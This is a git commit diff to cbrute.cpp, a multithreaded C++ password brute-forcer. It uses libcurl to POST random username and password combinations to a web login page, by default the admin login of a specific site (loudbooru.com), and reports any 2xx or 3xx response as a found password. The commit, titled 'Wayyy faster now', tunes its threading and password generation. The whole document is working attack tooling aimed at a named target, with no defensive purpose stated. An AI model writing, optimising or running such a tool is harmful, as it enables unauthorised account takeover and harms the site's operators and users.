fe33b24927403899eb3b040d7e0f025c94c06695
cobs0n <657549856783950@proton.me>
2024-06-01 20:48:11 +0200

    Update cbrute.cpp
    Wayyy faster now

--- cbrute.cpp
+++ cbrute.cpp
@@ -18,8 +18,9 @@
 #include <queue>
 #define TBB_USE_DEBUG 0
 #include <unordered_set>
-
-
+#include <bitset>
+#include <random>
+#include <shared_mutex>
 class ThreadPool {
 public:
     ThreadPool(size_t numThreads);
@@ -68,7 +69,7 @@ ThreadPool::ThreadPool(size_t numThreads) : stop(false) {
             });
     }
 
-    std::thread clearThread(&ThreadPool::clearQueuePeriodically, this, std::chrono::seconds(10)); 
+    std::thread clearThread(&ThreadPool::clearQueuePeriodically, this, std::chrono::seconds(10));
     clearThread.detach();
 }
 void ThreadPool::enqueue(std::function<void()> task) {
@@ -88,7 +89,6 @@ ThreadPool::~ThreadPool() {
     for (std::thread& worker : workers)
         worker.join();
 }
-
 // Global variables
 bool found = false;
 std::string found_pass = "";
@@ -97,7 +97,9 @@ std::string url = "https://loudbooru.com/user_admin/login";
 int i = 0;
 std::mutex mtx;
 std::vector<std::string> passwords;
+std::vector<std::string> bad_passwords;
 std::mutex passwords_mutex;
+std::shared_mutex s;
 
 void write_line(const std::string& file_path, const std::string& line) {
     std::vector<std::string> encodings = { "utf-8", "latin-1", "iso-8859-1", "cp1252" };
@@ -119,7 +121,7 @@ void write_line(const std::string& file_path, const std::string& line) {
 void write_lines(const std::string& file_path, const std::vector<std::string>& lines) {
     std::vector<std::string> encodings = { "utf-8", "latin-1", "iso-8859-1", "cp1252" };
 
-    std::ofstream file(file_path, std::ios_base::app); 
+    std::ofstream file(file_path, std::ios_base::app);
     if (!file.is_open()) {
         std::cerr << "Failed to open file for writing." << std::endl;
         return;
@@ -139,11 +141,11 @@ void write_lines(const std::string& file_path, const std::vector<std::string>& l
                     file << line << std::endl;
                     }));
                 success = true;
-                break; 
+                break;
             }
             catch (const std::exception& e) {
                 std::cerr << "An error occurred: " << e.what() << std::endl;
-                break; 
+                break;
             }
         }
         if (!success) {
@@ -178,25 +180,22 @@ std::vector<std::string> read_file(const std::string& file_path) {
     }
     return {};
 }
-std::vector<std::string> bad_passwords = read_file("bad_passwords.txt");
-
-
 std::string generate_password() {
     static const std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/";
     static const int max_length = 21;
     static std::random_device rd;
     static std::mt19937 gen(rd());
     static std::uniform_int_distribution<> dis(0, characters.size() - 1);
-    static std::mutex passwords_mutex;
-    static std::unordered_set<std::string> bad_passwords;
-    static std::unordered_set<std::string> passwords;
 
-    std::lock_guard<std::mutex> guard(passwords_mutex);
+    mtx.lock();
+    std::unordered_set<std::string> bad_passwords_set(bad_passwords.begin(), bad_passwords.end());
+    std::unordered_set<std::string> passwords_set(passwords.begin(), passwords.end());
+
 
     std::string password_attempt;
     std::unordered_set<char> used;
 
-    int length = dis(gen) % max_length + 1; 
+    int length = dis(gen) % max_length + 1;
     for (int i = 0; i < length; ++i) {
         char ch;
         do {
@@ -206,11 +205,13 @@ std::string generate_password() {
         used.insert(ch);
     }
 
-    while (bad_passwords.find(password_attempt) != bad_passwords.end() ||
-        passwords.find(password_attempt) != passwords.end()) {
+    while (bad_passwords_set.find(password_attempt) != bad_passwords_set.end() ||
+        passwords_set.find(password_attempt) != passwords_set.end()) {
+        std::unordered_set<std::string> bad_passwords_set(bad_passwords.begin(), bad_passwords.end());
+        std::unordered_set<std::string> passwords_set(passwords.begin(), passwords.end());
         password_attempt.clear();
         used.clear();
-        int length = dis(gen) % max_length + 1; // Random password length
+        int length = dis(gen) % max_length + 1;
         for (int i = 0; i < length; ++i) {
             char ch;
             do {
@@ -220,13 +221,20 @@ std::string generate_password() {
             used.insert(ch);
         }
     }
+    passwords.emplace_back(password_attempt);
+    mtx.unlock();
 
-    passwords.insert(password_attempt);
     return password_attempt;
 }
+
+
+
+
 size_t discard_data_callback(void* ptr, size_t size, size_t nmemb, void* userdata) {
     return size * nmemb;
 }
+
+
 
 void advanced_cracking() {
     CURL* curl;
@@ -238,12 +246,12 @@ void advanced_cracking() {
             std::string password = generate_password();
 
             // obtain user data and url-encode it
-            std::string url_user(curl_easy_escape(curl,user.c_str(),0));
-            std::string url_password (curl_easy_escape(curl,password.c_str(),0));
+            std::string url_user(curl_easy_escape(curl, user.c_str(), 0));
+            std::string url_password(curl_easy_escape(curl, password.c_str(), 0));
             std::string data = "user=" + url_user + "&pass=" + url_password;
 
             curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str()); 
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
 
             curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_data_callback);
 
@@ -255,7 +263,7 @@ void advanced_cracking() {
 
             long http_code = 0;
             curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
-            if (http_code >=200 && http_code < 400) {
+            if (http_code >= 200 && http_code < 400) {
 
                 std::cout << password;
                 found_pass = password;
@@ -274,6 +282,7 @@ void advanced_cracking() {
         }
     }
     catch (const std::exception& e) {
+       // std::cout << "Exception: " << e.what();
     }
 }
 
@@ -282,7 +291,7 @@ void status_report() {
     auto last_report_time = start_time;
     int attempts_since_last_report = 0;
     while (!found) {
-        std::this_thread::sleep_for(std::chrono::seconds(1)); 
+        std::this_thread::sleep_for(std::chrono::seconds(1));
         std::lock_guard<std::mutex> lock(mtx);
 
 
@@ -306,28 +315,35 @@ void status_report() {
 int main(int argc, char* argv[]) {
     std::thread status_thread(status_report);
     std::vector<std::thread> threads;
+    std::lock_guard<std::mutex> guard(passwords_mutex);
 
     status_thread.detach();
     if (argv[1]) {
         target = argv[1];
-    } else {
+    }
+    else {
         std::cout << "you must input a target";
         return 0;
     }
     if (argv[2]) {
         url = argv[2];
-    } else {
+    }
+    else {
         std::cout << "you must input a url";
         return 0;
     }
-    std::cout << "Initiating bruteforce against " << target << " on " << url << "\n";
-    ThreadPool pool(std::thread::hardware_concurrency()); 
 
+    bad_passwords = read_file("bad_passwords.txt");
+
+
+
+    std::cout << "Initiating bruteforce against " << target << " on " << url << "\n";
+    ThreadPool pool(std::thread::hardware_concurrency());
     while (!found) {
 
         for (int i = 0; i < 50; ++i) {
             try {
-                pool.enqueue(advanced_cracking); 
+                pool.enqueue(advanced_cracking);
 
             }
             catch (const std::exception& e) {
@@ -337,7 +353,6 @@ int main(int argc, char* argv[]) {
         }
         passwords.clear();
     }
-
 
     std::cout << found_pass;
     std::cout << found << std::endl;
